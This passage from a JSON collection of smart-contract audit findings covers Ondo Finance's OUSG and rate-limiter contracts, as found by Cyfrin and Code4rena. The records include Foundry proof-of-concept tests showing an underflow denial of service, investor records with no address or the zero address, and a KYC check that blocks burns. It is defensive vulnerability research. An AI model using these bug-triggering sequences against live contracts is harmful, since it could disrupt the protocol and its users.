currentInstantRedemptionAmount,\n      \"RateLimit: Redemption exceeds rate limit\"\n    );\n}\n```\n\n**Ondo:**\nFixed in commit [fb8ecff](https://github.com/ondoprotocol/rwa-internal/commit/fb8ecff80960c8c891ddc206c6f6f27a620e42d6).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31337",
      "title": "Prevent creating an investor record associated with no address",
      "impact": "LOW",
      "content": "**Description:** `InvestorBasedRateLimiter::initializeInvestorStateDefault` is supposed to associate a newly created investor with one or more addresses but the `for` [loop](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/InvestorBasedRateLimiter.sol#L253-L260) which does this can be bypassed by calling the function with an empty array:\n```solidity\nfunction initializeInvestorStateDefault(\n    address[] memory addresses\n    ) external onlyRole(CONFIGURER_ROLE) {\n    _initializeInvestorState(\n      addresses,\n      defaultMintLimit,\n      defaultRedemptionLimit,\n      defaultMintLimitDuration,\n      defaultRedemptionLimitDuration\n    );\n}\n\nfunction _initializeInvestorState(\n    address[] memory addresses,\n    uint256 mintLimit,\n    uint256 redemptionLimit,\n    uint256 mintLimitDuration,\n    uint256 redemptionLimitDuration\n    ) internal {\n    uint256 investorId = ++investorIdCounter;\n\n    // @audit this `for` loop can by bypassed by calling\n    // `initializeInvestorStateDefault` with an empty array\n    for (uint256 i = 0; i < addresses.length; ++i) {\n      // Safety check to ensure the address is not already associated with an investor\n      // before associating it with a new investor\n      if (addressToInvestorId[addresses[i]] != 0) {\n        revert AddressAlreadyAssociated();\n      }\n      _setAddressToInvestorId(addresses[i], investorId);\n    }\n\n    investorIdToMintState[investorId] = RateLimit({\n      currentAmount: 0,\n      limit: mintLimit,\n      lastResetTime: block.timestamp,\n      limitDuration: mintLimitDuration\n    });\n    investorIdToRedemptionState[investorId] = RateLimit({\n      currentAmount: 0,\n      limit: redemptionLimit,\n      lastResetTime: block.timestamp,\n      limitDuration: redemptionLimitDuration\n    });\n}\n```\n\n**Impact:** An investor record can be created without any associated address. This breaks the following invariant of the `InvestorBasedRateLimiter` contract:\n\n> when a new `investorId` is created, it should be associated with one or more valid addresses\n\n**Proof of Concept:** Add this drop-in PoC to `forge-tests/ousg/InvestorBasedRateLimiter/setters.t.sol`:\n```solidity\nfunction test_initializeInvestor_NoAddress() public {\n    // no investor created\n    assertEq(0, rateLimiter.investorIdCounter());\n\n    // empty input array will bypass the `for` loop that is supposed\n    // to associate addresses to the newly created investor\n    address[] memory addresses;\n\n    vm.prank(guardian);\n    rateLimiter.initializeInvestorStateDefault(addresses);\n\n    // one investor created\n    assertEq(1, rateLimiter.investorIdCounter());\n\n    // not associated with any addresses\n    assertEq(0, rateLimiter.investorAddressCount(1));\n}\n```\n\nRun with: `forge test --match-test test_initializeInvestor_NoAddress`\n\n**Recommended Mitigation:** In `_initializeInvestorState` revert if the input address array is empty:\n```solidity\nuint256 addressesLength = addresses.length;\n\nif(addressesLength == 0) revert EmptyAddressArray();\n```\n\n**Ondo:**\nFixed in commit [bac99d0](https://github.com/ondoprotocol/rwa-internal/commit/bac99d03d75e84ea5541297b3aa0751283c1272e).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31336",
      "title": "Prevent creating an investor record associated with the zero address",
      "impact": "LOW",
      "content": "**Description:** `InvestorBasedRateLimiter::checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` can create a new investor record and associate it with the zero address.\n\n**Impact:** Investor records can be created which are associated with the zero address. This breaks the following invariant of the `InvestorBasedRateLimiter` contract:\n\n> when a new `investorId` is created, it should be associated with one or more valid addresses\n\n**Proof of Concept:** Add this drop-in PoC to `forge-tests/ousg/InvestorBasedRateLimiter/client.t.sol`:\n```solidity\nfunction test_mint_zero_address() public {\n    uint256 mintAmount = rateLimiter.defaultMintLimit();\n    vm.prank(client);\n    rateLimiter.checkAndUpdateMintLimit(address(0), mintAmount);\n\n    // an investor has been created with a 0 address\n    assertEq(1, rateLimiter.addressToInvestorId(address(0)));\n\n    // same issue affects checkAndUpdateRedemptionLimit\n}\n```\n\nRun with: `forge test --match-test test_mint_zero_address`\n\n**Recommended Mitigation:** In `_setAddressToInvestorId` revert for the zero address:\n```solidity\nfunction _setAddressToInvestorId(\n    address investorAddress,\n    uint256 newInvestorId\n) internal {\n    if(investorAddress == address(0)) revert NoZeroAddress();\n```\n\n**Ondo:**\nFixed in commit [bac99d0](https://github.com/ondoprotocol/rwa-internal/commit/bac99d03d75e84ea5541297b3aa0751283c1272e).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31335",
      "title": "`InvestorBasedRateLimiter::setInvestorMintLimit` and `setInvestorRedemptionLimit` can make subsequent calls to `checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` revert due to underflow",
      "impact": "LOW",
      "content": "**Description:** `InvestorBasedRateLimiter::_checkAndUpdateRateLimitState` [L211-213](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/InvestorBasedRateLimiter.sol#L211-L213) subtracts the current mint/redemption amount from the corresponding limit:\n```solidity\nif (amount > rateLimit.limit - rateLimit.currentAmount) {\n  revert RateLimitExceeded();\n}\n```\n\nIf `setInvestorMintLimit` or `setInvestorRedemptionLimit` are used to set the limit amount for minting or redemptions smaller than the current mint/redemption amount, calls to this function will revert due to underflow.\n\n**Impact:** `InvestorBasedRateLimiter::setInvestorMintLimit` and `setInvestorRedemptionLimit` can make subsequent calls to `checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` revert due to underflow.\n\n**Proof of Concept:** Add this drop-in PoC to `forge-tests/ousg/InvestorBasedRateLimiter/setters.t.sol`:\n```solidity\nfunction test_setInvestorMintLimit_underflow_DoS() public initDefault(alice) {\n    // first perform a mint\n    uint256 mintAmount = rateLimiter.defaultMintLimit();\n    vm.prank(client);\n    rateLimiter.checkAndUpdateMintLimit(alice, mintAmount);\n\n    // admin now reduces the mint limit to be under the current\n    // minted amount\n    uint256 aliceInvestorId = 1;\n    uint256 newMintLimit = mintAmount - 1;\n    vm.prank(guardian);\n    rateLimiter.setInvestorMintLimit(aliceInvestorId, newMintLimit);\n\n    // subsequent calls to `checkAndUpdateMintLimit` revert due to underflow\n    vm.prank(client);\n    rateLimiter.checkAndUpdateMintLimit(alice, 1);\n\n    // same issue affects `setInvestorRedemptionLimit`\n}\n```\n\nRun with: `forge test --match-test test_setInvestorMintLimit_underflow_DoS`\n\nProduces output:\n```\nRan 1 test for forge-tests/ousg/InvestorBasedRateLimiter/setters.t.sol:Test_InvestorBasedRateLimiter_setters_ETH\n[FAIL. Reason: panic: arithmetic underflow or overflow (0x11)] test_setInvestorMintLimit_underflow_DoS() (gas: 264384)\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.09ms (116.74Âµs CPU time)\n```\n\n**Recommended Mitigation:** Explicitly handle the case where the limit is smaller than the current mint/redemption amount:\n```solidity\nif (rateLimit.limit <= rateLimit.currentAmount || amount > rateLimit.limit - rateLimit.currentAmount) {\n  revert RateLimitExceeded();\n}\n```\n\n**Ondo:**\nFixed in commit [fb8ecff](https://github.com/ondoprotocol/rwa-internal/commit/fb8ecff80960c8c891ddc206c6f6f27a620e42d6).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "32021",
      "title": "[NC-05] Misspelled parameter",
      "impact": "LOW",
      "content": "\n[`ousgInstantManager::setInstantRedemptionLimitDuration`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L540-L544):\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n540:  function setInstantRedemptionLimitDuration(\n541:    uint256 _instantRedemptionLimitDuratioin\n542:  ) external override onlyRole(CONFIGURER_ROLE) {\n543:    _setInstantRedemptionLimitDuration(_instantRedemptionLimitDuratioin);\n544:  }\n```\n\nHere `_instantRedemptionLimitDuratioin` is misspelled, also in the [natspec](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L536) for the call. Consider changing it to `_instantRedemptionLimitDuration`.\n\n**[cameronclifton (Ondo) confirmed and commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/162#issuecomment-2071080011):**\n> [L-01] - Will not be addressing, the existing functionality is desired.<br>\n>[L-02] - Will not be addressing.<br>\n> [L-03] - Addressed, `usdcReceiver` is now settable.<br>\n> [L-04] - Will not be addressing.<br>\n> [L-05] - Will not be addressing.\n>\n> All Non-Criticals - Addressed.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/162).*\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32020",
      "title": "[NC-04] Erroneous math in documentation",
      "impact": "LOW",
      "content": "\nIn the documentation for `rOUSG` it says [`rOUSG#L36-L45`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/rOUSG.sol#L36-L45):\n\n```solidity\nFile: contracts/ousg/rOUSG.sol\n\n36: * For example, assume that we have:\n37: *\n38: *   ousgPrice = 100.505\n39: *   sharesOf(user1) -> 100\n40: *   sharesOf(user2) -> 400\n41: *\n42: * Therefore:\n43: *\n44: *   balanceOf(user1) -> 105 tokens which corresponds 105 rOUSG\n45: *   balanceOf(user2) -> 420 tokens which corresponds 420 rOUSG\n```\n\nThis is confusing. As first, one share is one ten-thousandth of a `OUSG`; it is unclear what a \"share\" means here. Second, the math is wrong, `100 * 100.505 / 100 = 100.505` and `400 * 100.505 / 100 = 402.02`.\n\nConsider updating the documentation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32019",
      "title": "[NC-03] Inconsistent `address(0)` checks",
      "impact": "LOW",
      "content": "\n[`ousgInstantManager::setOracle`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L638-L643), [`setFeeReceiver`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L650-L656) and [`setInvestorBasedRateLimiter`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L663-L673) all let admin change various addresses to external contracts.\n\nHowever, only `setFeeReceiver` checks for `address(0)` before assigning. Consider checking for `address(0)` in all or none of the calls to have consistent behavior.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32018",
      "title": "[NC-02] `usdcfees` doesn't follow `camelCase`",
      "impact": "LOW",
      "content": "\n[`ousgInstantManager::_mint`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L303):\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n303:    uint256 usdcfees = _getInstantMintFees(usdcAmountIn);\n```\n\nHere `usdcfees` isn't camel cased. In [`_redeem`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L415) the same variable is using `camelCase`, which is the naming convention used throughout the code.\n\nConsider using `camelCase` for `usdcfees` in `_mint` as well.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32017",
      "title": "[NC-01] Unnecessary checks",
      "impact": "LOW",
      "content": "\n[`ousgInstantManager::_redeem`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L415-L420):\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n415:    uint256 usdcFees = _getInstantRedemptionFees(usdcAmountToRedeem);\n416:    usdcAmountOut = usdcAmountToRedeem - usdcFees;\n417:    require(\n418:      usdcAmountOut > 0,\n419:      \"OUSGInstantManager::_redeem: redeem amount can't be zero\"\n420:    );\n```\n\n`usdcAmountOut` can never be `0` here, as there is already [a check](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L402-L405) that `usdcAmountToRedeem` is greater than `minimumRedemptionAmount` and `minimumRedemptionAmount` can be at [the lowest `10_000`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L602-L605).\n\nThe `redeemFee` can also be [no larger than 2%](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L570). Hence, `usdcAmountOut` can never be lower than `9_800` (`10_000 - ((10_000 * 200) / 10_000)`).\n\nThe same logic applies to the `ousgAmountOut` in [`_mint`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L310-L313); however, the math is a bit more complicated since the lowest possible `9_800` `usdc` is converted to `OUSG`. However, due to the price having a lower cap, neither this can ever be `0`.\n\nConsider removing these two checks.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32016",
      "title": "[L-05] Lack of safe transfer wrapper",
      "impact": "LOW",
      "content": "\nIn `ousgInstantManager` the admin can make a call to transfer any tokens out of the contract.\n\n[`ousgInstantManager::retrieveTokens`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L819-L825):\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n819:  function retrieveTokens(\n820:    address token,\n821:    address to,\n822:    uint256 amount\n823:  ) external onlyRole(DEFAULT_ADMIN_ROLE) {\n824:    IERC20(token).transfer(to, amount);\n825:  }\n```\n\nSome tokens behave [weirdly](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#revert-on-zero-value-transfers) when transferred and need some extra attention.\n\n### Recommendation\n\nConsider using OZ `safeTransfer` wrapper to transfer tokens for better compatibility with different tokens.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32015",
      "title": "[L-04] `ousgInstantManager::mint`/`redeem` lacks slippage parameter",
      "impact": "LOW",
      "content": "\nIn `ousgInstantManager` you can mint either `rOUSG` or `OUSG` using `USDC` and then redeem back to `USDC`. Both of these use an oracle to track the price of `OUSG`. This price can vary between when a transaction is sent to when it is executed. This can cause a user to mint or redeem at a different price than they intended.\n\n### Recommendation\n\nConsider adding a `minOut` parameter for `ousgInstantManager::mint` and `redeem` calls.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32014",
      "title": "[L-03] `usdcReceiver` is immutable",
      "impact": "LOW",
      "content": "\nWhenever someone mints, their `USDC` payment is sent to the address `usdcReciver`.\n\n[`ousgInstantManager::_mint`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L319):\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n319:    usdc.transferFrom(msg.sender, usdcReceiver, usdcAmountAfterFee);\n```\n\nThe issue is that `usdcReceiver` is [immutable](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L90):\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n90:  address public immutable usdcReceiver;\n```\n\nWhere this address is to be blocked by Circle, minting in `ousgInstantManager` would stop to work and a new `ousgInstantManager` would have to be deployed using a new `usdcReceiver`. This could be confusing for users.\n\n### Recommendation\n\nConsider making `usdcReceiver` mutable and add a way for the protocol to change it.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32013",
      "title": "[L-02] User blocked by Circle cannot redeem",
      "impact": "LOW",
      "content": "\nWhen instant redeeming either `OUSG` or `rOUSG`, at the end the user is funded their `USDC`.\n\n[`ousgInstantManager::_redeem`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L455):\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n455:    usdc.transfer(msg.sender, usdcAmountOut);\n```\n\nThe issue is that Circle (owner of `USDC`) can add addresses to a blocklist. If the user holding `OUSG` (or `rOUSG`) is blocked by Circle, they will never be able to redeem.\n\n### Recommendation\n\nConsider adding an `address to` for redemptions so that they can send the `USDC` to an address that is not blocked by Circle.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32012",
      "title": "[L-01] No oracle price staleness checks",
      "impact": "LOW",
      "content": "\nBoth `ousgInstantManager` and `rOUSG` uses an oracle to determine the price of `OUSG`.\n\n[`rOUSG::getOUSGPrice`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/rOUSG.sol#L378-L380):\n\n```solidity\nFile: contracts/ousg/rOUSG.sol\n\n378:  function getOUSGPrice() public view returns (uint256 price) {\n379:    (price, ) = oracle.getPriceData();\n380:  }\n```\n\nVery similar in [`ousgInstantManager::getOUSGPrice`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/ousg/ousgInstantManager.sol#L479-L485) but with a \"lowest\" price check.\n\nHere only the first parameter, `price` is used. However, the second parameter returned is the [`priceTimestamp`](https://github.com/code-423n4/2024-03-ondo-finance/blob/main/contracts/rwaOracles/RWAOracleExternalComparisonCheck.sol#L127), which is the timestamp at which the price was updated. If this is old it can lead to incorrect `OUSG` prices used for `rOUSG` or instant `minting`/`redeeming`.\n\n### Recommendation\n\nConsider adding a check to confirm the price used isn't stale.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32011",
      "title": "[M-04] The `BURNER` cannot burn tokens from accounts not KYC verified due to the check in `_beforeTokenTransfer`.",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-ondo-finance/blob/be2e9ebca6fca460c5b0253970ab280701a15ca1/contracts/ousg/rOUSG.sol#L586-L606>\n\n<https://github.com/code-423n4/2024-03-ondo-finance/blob/be2e9ebca6fca460c5b0253970ab280701a15ca1/contracts/ousg/rOUSG.sol#L624-L640>\n\n### Impact\n\nThe `BURNER_ROLE` cannot burn tokens if the target `account` has been removed from the KYC list.\n\n### Proof of Concept\n\nWhen the `BURNER_ROLE` burns tokens of `_account`, it invokes `_burnShares` and then calls `_beforeTokenTransfer` to verify the KYC status of `_account`.\n\nIn accordance with a previous audit [report](https://code4rena.com/reports/2023-09-ondo#m-04-admin-cant-burn-tokens-from-blocklisted-addresses-because-of-a-check-in-\\_beforetokentransfer-), the `BURNER_ROLE` should have the capability to burn tokens of any account, even if the account is blacklisted; or, in this case, not KYC verified. However, there is no mechanism that allows `BURNER_ROLE` to burn tokens of accounts that are removed from KYC list.\n\n```solidity\n  function burn(\n    address _account,\n    uint256 _amount\n  ) external onlyRole(BURNER_ROLE) {\n    uint256 ousgSharesAmount = getSharesByROUSG(_amount);\n    if (ousgSharesAmount < OUSG_TO_ROUSG_SHARES_MULTIPLIER)\n      revert UnwrapTooSmall();\n\n    _burnShares(_account, ousgSharesAmount);\n\n    ousg.transfer(\n      msg.sender,\n      ousgSharesAmount / OUSG_TO_ROUSG_SHARES_MULTIPLIER\n    );\n    emit Transfer(address(0), msg.sender, getROUSGByShares(ousgSharesAmount));\n    emit TransferShares(_account, address(0), ousgSharesAmount);\n  }\n```\n\n```solidity\n  function _beforeTokenTransfer(\n    address from,\n    address to,\n    uint256\n  ) internal view {\n    // Check constraints when `transferFrom` is called to facliitate\n    // a transfer between two parties that are not `from` or `to`.\n    if (from != msg.sender && to != msg.sender) {\n      require(_getKYCStatus(msg.sender), \"rOUSG: 'sender' address not KYC'd\");\n    }\n// When from is not KYC, BURNER can not burn their tokens\n    if (from != address(0)) {\n      // If not minting\n      require(_getKYCStatus(from), \"rOUSG: 'from' address not KYC'd\");\n    }\n\n    if (to != address(0)) {\n      // If not burning\n      require(_getKYCStatus(to), \"rOUSG: 'to' address not KYC'd\");\n    }\n  }\n```\n\n### POC\n\nAdd the test to `forge-tests/ousg/rOUSG.t.sol` and run it with:\n\n```\n    forge test --fork-url $(grep -w ETHEREUM_RPC_URL .env | cut -d '=' -f2) --fork-block-number $(grep -w FORK_FROM_BLOCK_NUMBER_MAINNET .env | cut -d '=' -f2) --nmc ASSERT_FORK --match-test test_burn_with_NOKYC\n```\n\n```diff\ndiff --git a/forge-tests/ousg/rOUSG.t.sol b/forge-tests/ousg/rOUSG.t.sol\nindex 67faa15..b39b4ac 100644\n--- a/forge-tests/ousg/rOUSG.t.sol\n+++ b/forge-tests/ousg/rOUSG.t.sol\n@@ -13,6 +13,7 @@ contract Test_rOUSG_ETH is OUSG_BasicDeployment {\n     CashKYCSenderReceiver ousgProxied = CashKYCSenderReceiver(address(ousg));\n     vm.startPrank(OUSG_GUARDIAN);\n     ousgProxied.grantRole(ousgProxied.MINTER_ROLE(), OUSG_GUARDIAN);\n+    ousgProxied.grantRole(ousgProxied.BURNER_ROLE(), OUSG_GUARDIAN);\n     vm.stopPrank();\n\n     // Sanity Asserts\n@@ -26,6 +27,15 @@ contract Test_rOUSG_ETH is OUSG_BasicDeployment {\n     assertTrue(registry.getKYCStatus(OUSG_KYC_REQUIREMENT_GROUP, alice));\n   }\n\n+  function test_burn_with_NOKYC() public dealAliceROUSG(1e18) {\n+      vm.startPrank(OUSG_GUARDIAN);\n+      _removeAddressFromKYC(OUSG_KYC_REQUIREMENT_GROUP, alice);\n+      vm.stopPrank();\n+\n+      vm.startPrank(OUSG_GUARDIAN);\n+      rOUSGToken.burn(alice, 1e18);\n+      vm.stopPrank();\n+  }\n   /*//////////////////////////////////////////////////////////////\n                         rOUSG Metadata Tests\n   //////////////////////////////////////////////////////////////*/\n```\n\nResult:\n\n    Ran 1 test for forge-tests/ousg/rOUSG.t.sol:Test_rOUSG_ETH\n    [FAIL. Reason: revert: rOUSG: 'from' address not KYC'd] test_burn_with_NOKYC() (gas: 246678)\n    Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 11.44ms (1.15ms CPU time)\n\n    Ran 1 test suite in 1.12s (11.44ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\n    Failing tests:\n    Encountered 1 failing test in forge-tests/ousg/rOUSG.t.sol:Test_rOUSG_ETH\n    [FAIL. Reason: revert: rOUSG: 'from' address not KYC'd] test_burn_with_NOKYC() (gas: 246678)\n\n    Encountered a total of 1 failing tests, 0 tests succeeded\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nAllow the `BURNER` to burn tokens without checking the KYC of `from` address.\n\n```diff\ndiff --git a/contracts/ousg/rOUSG.sol b/contracts/ousg/rOUSG.sol\nindex 29d9112..6809a28 100644\n--- a/contracts/ousg/rOUSG.sol\n+++ b/contracts/ousg/rOUSG.sol\n@@ -594,7 +594,7 @@ contract ROUSG is\n       require(_getKYCStatus(msg.sender), \"rOUSG: 'sender' address not KYC'd\");\n     }\n\n-    if (from != address(0)) {\n+    if (from != address(0) && !hasRole(BURNER_ROLE, msg.sender)) {\n       // If not minting\n       require(_getKYCStatus(from), \"rOUSG: 'from' address not KYC'd\");\n     }\n```\n\n### Assessed type\n\nInvalid Validation\n\n**[3docSec (judge) commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/32#issuecomment-2068138063):**\n >The reasons why I opted to keep this as Medium is:\n> - The possibility of changing a contract implementation (in this case the registry) to a new implementation (that is not in scope) [is not something that is generally accepted as a severity mitigation](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-using-contract-upgradability-as-a-severity-mitigation)\n> - The same finding was already judged [as a valid Medium](https://github.com/code-423n4/2023-09-ondo-findings/issues/136) in a previous audit with a different scope (rUSDY), that was not explicitly marked as a known issue in the README\n\n**[cameronclifton (Ondo) disputed and commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/32#issuecomment-2068129831):**\n > We will not be addressing this as we have a safe workaround for this exact scenario.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/32).*\n\n***\n\n",
      "summary": "\nThis bug report outlines an issue with the `BURNER_ROLE` in the `rOUSG.sol` contract. The impact of this bug is that the `BURNER_ROLE` cannot burn tokens if the target account is removed from the KYC list. This is due to a check in the `_beforeTokenTransfer` function that verifies the KYC status of the account. The proof of concept provided shows that the `BURNER_ROLE` should have the capability to burn tokens of any account, even if the account is not KYC verified. However, there is no mechanism in place to allow this for accounts removed from the KYC list. The recommended mitigation steps involve allowing the `BURNER_ROLE` to burn tokens without checking the KYC of the `from` address. This issue was assessed as a Medium severity, although there is some dispute about this. The team has decided not to address this issue as they have a safe workaround for this scenario. For more information, refer to the full discussion in the provided link.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/32",
      "tags": [
        "Validation"
      ],
      "finders": [
        "leegh",
        "ZanyBonzy",
        "ni8mare",
        "radev\\_sw",
        "Shubham",
        "Limbooo",
        "dvrkzy",
        "kaden",
        "Krace",
        "SpicyMeatball",
        "0xDemon",
        "yotov721",
        "kartik\\_giri\\_47538",
        "Arz",
        "Tychai0s",
        "ast3ros"
      ]
    },
    {
      "id": "32010",
      "title": "[M-03] Users can lose access to funds due to minimum withdrawal limits",
      "impact": "MEDIUM",
      "content": "\nThe `InstantManager` contract restricts deposits and withdrawals to certain minimum amounts. Users can deposit a minimum of 100k `USDC` tokens, and withdraw a minimum of 50k `USDC` tokens.\n\nThe issue is that the minimum withdrawal limit can lead to users losing access to part of their funds. Say a user deposits 100k `USDC` tokens and then later withdraws 60k `USDC` tokens. Now, the user only has 40k `USDC` worth holdings in their account, and cannot withdraw the full amount. This is because it falls below the minimum withdrawal limit of 50k `USDC` tokens. The user is now stuck with 40k `USDC` tokens in their account, and cannot withdraw them.\n\nThe only option the user has is to deposit 100k `USDC` more, and then withdraw the whole 140k `USDC` amount. This will incur fees on the extra 100k `USDC` the user brings as well. Thus this is a Medium severity issue.\n\n### Proof of Concept\n\nThe scenario can be recreated in the following steps:\n\n1. User ALICE deposits 100k `USDC` tokens.\n2. User ALICE withdraws 60k `USDC` tokens.\n3. User ALICE tries to withdraw 40k `USDC` tokens. The contract reverts, as the amount is below the minimum withdrawal limit of 50k `USDC` tokens.\n\n### Recommended Mitigation Steps\n\nAllow users to remove all their funds from the contract even if it is below the minimum limit. Since the protocol now uses a more liquid system such as the `BUIDL` token, this should be possible and should not affect the protocol's functioning.\n\n**[3docSec (judge) 